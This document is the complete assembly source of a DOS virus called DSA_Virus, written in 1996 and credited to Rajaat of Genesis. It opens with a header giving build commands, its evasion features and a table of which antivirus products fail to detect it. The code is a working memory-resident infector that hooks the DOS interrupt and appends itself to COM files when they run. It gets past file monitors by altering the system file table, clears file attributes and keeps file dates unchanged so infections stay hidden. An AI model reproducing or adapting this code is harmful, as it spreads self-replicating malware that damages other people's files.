;=====( DSA_Virus by Rajaat )==================================================
;
; Memory resident appending COM infector, residing in the stack space reserved
; for the DOS AH < 0ch calls. Works through TBFILE using SFT manipulation,
; obtained through the DSA. File date/time won't be altered and the virus can
; circumvent attributes. The virus is, compiled with TASM, a mere 263 bytes
; long.
;
;==============================================================================
;
; Virus name    : DSA_Virus
; Author        : Rajaat
; Origin        : United Kingdom, July 1996
; Compiling     : Using TASM
;
;                 TASM /M DSAVIRUS
;                 TLINK /T DSAVIRUS
; Targets       : COM files
; Size          : 263 bytes
; Resident      : Yes, no decrease in memory reported
; Polymorphic   : No
; Encrypted     : No
; Stealth       : Memory only, by utilizing dos stack space
; Tunneling     : Uses SFT to avoid some monitors
; Retrovirus    : Yes, uses TbSpoof
; Antiheuristics: Yes
; Peculiarities : Makes extensive use of the Dos Swappable Area (DSA)
; Drawbacks     : Might crash, I'm not sure :)
; Behaviour     : The first time the DSA virus is executed, it will check if
;                 it's already resident in memory by looking at the first byte
;                 in the DOS stack, located in the DSA. If this resembles a
;                 mov bp,xxxx instruction, it's already resident and the DSA
;                 virus will return control to the host program. If not, the
;                 virus will install itself in the DOS stack area, reserved for
;                 DOS INT 21 functions below 0ch. It will hook INT 21. If a
;                 program is executed while the DSA virus is resident, it will
;                 open it in read-only mode. Then it will use the DSA to locate
;                 the current SFT. In the SFT it modifies the read-only mode to
;                 read/write, effectively passing the file checks of TBFILE. It
;                 will also clear the file attributes during the infection
;                 process by using the SFT. The DSA virus will read the first
;                 5 bytes of the file and checks wether the file is already
;                 infected or if it is an EXE file. If both checks are passed
;                 successfully, it will write itself at the end of the file
;                 and patches the start of the COM file to point at its code.
;                 The infected file increases by 263 bytes. Before closing the
;                 file, the DSA virus sets the file date/time update flag, so
;                 the date won't change after infection. After infection it
;                 will set the file attribute again and return control to it's
;                 caller.
;
;                 It's unknown what this virus might do besides replicate :)
;==============================================================================
;
; Results with antivirus software
;
;       TBFILE                    - Doesn't detect it
;       TBSCAN                    - Doesn't detect it
;       TBMEM                     - Detects it
;       TBCLEAN                   - Cleans it, so what?
;       SVS                       - Detects it
;       SSC                       - Doesn't detect it
;       F-PROT                    - Doesn't detect it
;       F-PROT /ANALYSE           - Doesn't detect it
;       F-PROT /ANALYSE /PARANOID - Doesn't detect it
;       AVP                       - Detects it
;       VSAFE                     - Corrupts infected files on my system!
;       NEMESIS                   - I don't try this one anymore
;
;==============================================================================

.model tiny
.code
.radix 16
.286            ; why bother with XT?

                org 100

DSA_Virus:      mov bp,0                        ; delta offset
Relative_Offset equ $-2
                mov ax,5d06                     ; get DSA pointer
                int 21                          ;

                cmp byte ptr [si+600],0bdh      ; mov bp in stack memory?
                jne Install_TSR                 ; no, install virus

;=====( Return to host )=======================================================

Return_to_host: push cs cs                      ; move 5 bytes to offset 100h
                pop ds es                       ; and execute host
                lea si,COM_Host[bp]
                pop ax
                mov di,0ff
                stosb
                push di
                movsw
                movsw
                movsb
                ret

;=====( Install virus in memory )==============================================

Install_TSR:    xchg ax,si
                test al,0f                      ; DSA at paragraph boundary?
                jnz Return_to_host              ; no, abort

                add ah,5                        ; DSA+600 = DOS stack for
                shr ax,4                        ; ah < 0ch, virus re-aligns
                mov bx,ds                       ; segment, so offset is
                add ax,bx                       ; 100, like in COM files
                push cs
                pop ds
                mov es,ax
                lea si,DSA_Virus[bp]
                mov di,100
                mov cx,Virus_Length
Move_Virus:     lodsb
                stosb
                loop Move_Virus                 ; move virus to stack space
                push es
                pop ds

                mov ax,4521                     ; get int 21
                sub ah,10
                int 21
                mov word ptr INT_21,bx
                mov word ptr INT_21+2,es

                mov ah,25                       ; set int 21
                lea dx,New_21
                int 21

                jmp Return_to_host              ; restore host

;=====( Data to place at the start of a COM file )=============================

Signature       db '[DSA by Rajaat / Genesis]'

Virus_Jump:     db 'PK'                         ; TbSpoof
                db 0e9                          ; jump to virus

;=====( First 5 bytes of host data )===========================================

COM_Host        db 0cdh,020h,0,0,0

;=====( Resident INT 21 handler )==============================================

New_21:         not ax
                cmp ax,not 4b00                 ; execute file?
                not ax
                jne Int_21_Done                 ; no, abort

Check_Infect:   push ax bx dx ds es
                mov ah,3dh                      ; open read-only
                int 21
                xchg ax,bx

                mov ax,5d06                     ; get DSA
                int 21

                lds si,dword ptr ds:[si+27e]    ; get current SFT

                push si ds
                mov word ptr [si+2],2           ; open mode is now read/write
                mov al,byte ptr [si+4]          ; get file attribute
                mov byte ptr [si+4],0           ; clear file attribute
                push ax                         ; push file attribute on stack
                push cs
                pop ds

                mov ah,3f                       ; read first 5 bytes of host
                mov cx,5
                lea dx,COM_Host
                int 21

                mov ax,word ptr [Com_Host]
                sub ax,'KP'                     ; PK signature?
                jz is_infected                  ; yes, abort
                sub ax,'ZM'-'KP'                ; MZ signature (EXE file)
                jz is_infected                  ; yes, abort

                mov ax,4202                     ; goto end of file
                xor cx,cx
                cwd
                int 21

                mov word ptr Relative_Offset,ax ; store relative offset
                push ax

                mov ah,1                        ; write virus at end of file
                shl ah,6
                mov cx,Virus_Length
                lea dx,DSA_Virus
                int 21

                mov ax,4200                     ; goto start of file
                xor cx,cx
                cwd
                int 21

                pop ax                          ; calculate jump address
                mov cx,5
                sub ax,cx
                mov word ptr Com_Host,ax

                mov ah,40                       ; write jump at start of file
                lea dx,Virus_Jump
                int 21

Is_Infected:    pop ax ds si
                mov byte ptr [si+4],al          ; restore file attributes
                or byte ptr [si+6],40           ; don't change file date/time
                mov ah,3e                       ; close file
                int 21
                pop es ds dx bx ax
Int_21_Done:    db 0ea                          ; chain to old int 21

Virus_Length    equ $-DSA_Virus

;=====( Data used by the virus, but not written to files )=====================

INT_21          dd 0

end DSA_Virus
